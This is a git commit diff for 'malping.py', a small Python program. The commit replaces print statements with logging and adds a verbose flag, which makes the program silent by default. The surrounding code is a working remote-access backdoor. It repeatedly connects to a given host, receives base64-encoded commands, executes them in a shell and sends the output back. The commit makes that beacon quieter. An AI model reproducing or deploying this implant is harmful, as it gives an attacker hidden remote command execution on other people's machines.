0e46446de3c7f18c13a5f683dffd2f611781801d
Mark Mossberg <mark.mossberg@gmail.com>
2014-06-02 22:35:47 -0400

    implement silent/verbose modes
    Using the loggin module, implement a verbose mode which does not output
    any of the debugging information.
    
    - Fixes #1

--- malping.py
+++ malping.py
@@ -7,8 +7,10 @@ import base64
 import datetime
 import argparse
 import subprocess
+import logging as log
 
 SIZE = 1024
+
 
 def get_args():
     """ Parse arguments and return dictionary. """
@@ -17,16 +19,24 @@ def get_args():
     parser.add_argument('host', metavar='IP', type=str)
     parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
     parser.add_argument('-p', '--port')
+    parser.add_argument('-v', '--verbose', action="store_true")
     return parser.parse_args()
+
 
 def main():
     args = get_args()
+
+    if args.verbose:
+        log.basicConfig(format='%(message)s', level=log.INFO)
+    else:
+        log.basicConfig(format='%(message)s')
+
     DELAY = args.delay
     HOST = args.host
     PORT = int(args.port) if args.port else 80
 
-    print ('[+] Malping started with delay of {} seconds to port {}.' +
-           ' Ctrl-c to exit.').format(DELAY, PORT)
+    log.info(('[+] Malping started with delay of {} seconds to port {}.' +
+              ' Ctrl-c to exit.').format(DELAY, PORT))
 
     while True:
         try:
@@ -34,19 +44,19 @@ def main():
             try:
                 s.connect((HOST, PORT))
                 cmd = base64.b64decode(s.recv(SIZE))
-                print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
-                                                       cmd)
+                log.info('[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
+                                                          cmd))
                 stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                           shell=True).communicate()[0]
                 response = base64.b64encode(stdout)
                 s.send(response)
             except socket.error:
-                print ('[!] ({}) Could not connect to server.' +
-                       ' Waiting...').format(datetime.datetime.now())
+                log.info(('[!] ({}) Could not connect to server.' +
+                          ' Waiting...').format(datetime.datetime.now()))
             finally:
                 time.sleep(DELAY)
         except KeyboardInterrupt:
-            print '[-] Malping terminated.'
+            log.info('[-] Malping terminated.')
             sys.exit(0)
 
 if __name__ == '__main__':
